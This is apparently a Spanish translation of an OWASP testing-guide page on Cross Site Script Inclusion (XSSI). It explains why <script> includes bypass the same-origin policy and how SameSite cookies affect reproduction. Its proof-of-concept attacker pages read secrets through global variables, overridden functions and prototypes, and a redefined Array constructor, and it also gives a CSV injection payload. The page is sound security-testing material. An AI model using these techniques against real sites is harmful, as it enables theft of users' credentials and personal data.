Inclusión de scripts entre sitios (Cross Site Script Inclusion)

ID
WSTG-CLNT-13

Resumen

La vulnerabilidad de Cross Site Script Inclusion (XSSI) permite la fuga de datos sensibles a través de los límites de origen o de dominio. Los datos sensibles pueden incluir datos relacionados con la autenticación (estados de inicio de sesión, cookies, tokens de autenticación, IDs de sesión, etc.) o datos personales o personales sensibles del usuario (direcciones de correo electrónico, números de teléfono, datos de tarjetas de crédito, números de seguridad social, etc.). XSSI es un ataque del lado del cliente similar al Cross Site Request Forgery (CSRF), pero con un propósito diferente. Mientras que CSRF utiliza el contexto del usuario autenticado para ejecutar ciertas acciones que cambian el estado dentro de la página de la víctima (p. ej., transferir dinero a la cuenta del atacante, modificar privilegios, restablecer la contraseña, etc.), XSSI utiliza en cambio JavaScript del lado del cliente para filtrar datos sensibles de sesiones autenticadas.

De manera predeterminada, los sitios web solo pueden acceder a datos si provienen del mismo origen. Este es un principio clave de seguridad de las aplicaciones y está regido por la política del mismo origen (definida por la RFC 6454). Un origen se define como la combinación del esquema de URI (HTTP o HTTPS), el nombre de host y el número de puerto. Sin embargo, esta política no se aplica a las inclusiones mediante la etiqueta HTML <script>. Esta excepción es necesaria, ya que sin ella los sitios web no podrían consumir servicios de terceros, realizar análisis de tráfico ni usar plataformas de publicidad, etc.

Cuando el navegador abre un sitio web con etiquetas <script>, los recursos se obtienen del dominio de origen cruzado. Los recursos se ejecutan entonces en el mismo contexto que el sitio o el navegador que los incluye, lo que presenta la oportunidad de filtrar datos sensibles. En la mayoría de los casos esto se logra mediante JavaScript; sin embargo, el origen del script no tiene que ser un archivo JavaScript con tipo text/javascript o extensión .js.

Vulnerabilidades históricas de los navegadores (como en IE9/10) permitían la fuga de datos mediante mensajes de error de ejecución detallados. Esta técnica ya no es representativa del comportamiento de los navegadores modernos. Al establecer el atributo charset de la etiqueta <script>, un atacante o evaluador puede forzar la codificación UTF-16, lo que permite en algunos casos la fuga de datos de otros formatos (p. ej., JSON). Para más información sobre estos ataques, consulte Identifier based XSSI attacks.

Objetivos de la prueba

  • Localizar datos sensibles en todo el sistema.
  • Evaluar la fuga de datos sensibles mediante diversas técnicas.

Cómo probar

Consideraciones sobre la cookie SameSite

Los ejemplos siguientes dependen de que el navegador adjunte la cookie de autenticación de la víctima a una petición <script src="..."> entre sitios (cross-site), es decir, una carga de subrecurso y no una navegación de nivel superior. Según el comportamiento de SameSite descrito en la sección Cookie Attributes, las cookies Lax no se envían en peticiones de subrecursos, por lo que, de manera predeterminada, estas pruebas de concepto no filtrarán datos en un navegador cuyo valor predeterminado sea Lax (los navegadores basados en Chromium, desde 2020), a menos que la cookie de sesión establezca explícitamente SameSite=None; Secure.

Esto no significa que la vulnerabilidad subyacente esté corregida, solo que reproducirla ahora depende de la configuración SameSite de la cookie y del navegador evaluado. Hay que revisar directamente la cabecera Set-Cookie. Repetir la prueba en Firefox o Safari no ayudará si una prueba de concepto no se activa: una carga <script src="..."> desde otro sitio es una petición de terceros y, de manera predeterminada, Firefox particiona y Safari bloquea las cookies de terceros, por lo que la cookie de sesión no se envía.

Recopilar datos con sesiones de usuario autenticadas y no autenticadas

Identificar qué endpoints son responsables de enviar datos sensibles, qué parámetros se requieren, e identificar todas las respuestas JavaScript relevantes generadas dinámica y estáticamente usando sesiones de usuario autenticadas. Hay que prestar especial atención a los datos sensibles enviados mediante JSONP. Para encontrar respuestas JavaScript generadas dinámicamente, se deben generar peticiones autenticadas y no autenticadas y compararlas. Si son diferentes, la respuesta es dinámica; de lo contrario, es estática. Para simplificar esta tarea, se puede utilizar una herramienta como el plugin de Burp proxy de Veit Hailperin. Hay que asegurarse de revisar otros tipos de archivo además de JavaScript; XSSI no se limita únicamente a archivos JavaScript.

Determinar si los datos sensibles pueden filtrarse mediante JavaScript

Los evaluadores deben analizar el código en busca de los siguientes vehículos de fuga de datos mediante vulnerabilidades XSSI:

  1. Variables globales
  2. Parámetros de funciones globales
  3. Robo de CSV (Comma Separated Values) con comillas
  4. Encadenamiento de prototipos usando this

1. Fuga de datos sensibles mediante variables globales

Una clave de API se almacena en un archivo JavaScript con la URI https://victim.com/internal/api.js en el sitio web de la víctima, victim.com, al que solo pueden acceder los usuarios autenticados. Un atacante configura un sitio web, attackingwebsite.com, y usa la etiqueta <script> para referirse al archivo JavaScript.

Este es el contenido de https://victim.com/internal/api.js:

(function() {
  window.secret = "supersecretUserAPIkey";
})();

El sitio del atacante, attackingwebsite.com, tiene un index.html con el siguiente código:

<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>

En este ejemplo, una víctima está autenticada en victim.com. Un atacante atrae a la víctima a attackingwebsite.com mediante ingeniería social, correos de phishing, etc. El navegador de la víctima obtiene entonces api.js, lo que provoca que los datos sensibles se filtren a través de la variable global de JavaScript y se muestren usando innerHTML.

2. Fuga de datos sensibles mediante parámetros de funciones globales

Este ejemplo es similar al anterior, excepto que en este caso attackingwebsite.com utiliza una función global de JavaScript para extraer los datos sensibles sobrescribiendo la función global de JavaScript de la víctima.

Este es el contenido de https://victim.com/internal/api.js:

(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();

El sitio del atacante, attackingwebsite.com, tiene un index.html con el siguiente código:

<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>

Existen otras vulnerabilidades XSSI que pueden resultar en la fuga de datos sensibles, ya sea mediante cadenas de prototipos de JavaScript o llamadas a funciones globales. Para más información sobre estos ataques, consulte The Unexpected Dangers of Dynamic JavaScript.

3. Fuga de datos sensibles mediante robo de CSV con comillas

Para filtrar datos, el atacante/evaluador tiene que poder inyectar código JavaScript en los datos CSV. El siguiente código de ejemplo es un extracto del whitepaper Identifier based XSSI attacks de Takeshi Terada.

HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"

En este ejemplo, usar las columnas ___ como puntos de inyección e insertar cadenas de JavaScript en su lugar tiene el siguiente resultado.

1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"

Jeremiah Grossman escribió sobre una vulnerabilidad similar en Gmail en 2006 que permitía extraer los contactos del usuario en JSON. En este caso, los datos se recibían de Gmail y eran analizados por el motor JavaScript del navegador usando un constructor Array sin referenciar para filtrar los datos. Un atacante podía acceder a este Array con los datos sensibles definiendo y sobrescribiendo el constructor interno de Array de esta manera:

<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="https://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>

4. Fuga de datos sensibles mediante encadenamiento de prototipos usando this

En JavaScript, la palabra clave this tiene alcance dinámico. Esto significa que si se llama a una función sobre un objeto, this apuntará a ese objeto aunque la función llamada pueda no pertenecer al propio objeto. Este comportamiento puede utilizarse para filtrar datos. En el siguiente ejemplo de la página de demostración de Sebastian Leike, los datos sensibles se almacenan en un Array. Un atacante puede sobrescribir Array.prototype.forEach con una función controlada por el atacante. Si algún código llama a la función forEach sobre una instancia de array que contiene valores sensibles, la función controlada por el atacante se invocará con this apuntando al objeto que contiene los datos sensibles.

Este es un extracto de un archivo JavaScript que contiene datos sensibles, javascript.js:

...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // do something here
  });  
})();
...

Los datos sensibles pueden filtrarse con el siguiente código JavaScript:

...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="https://victim.com/..../javascript.js"></script>
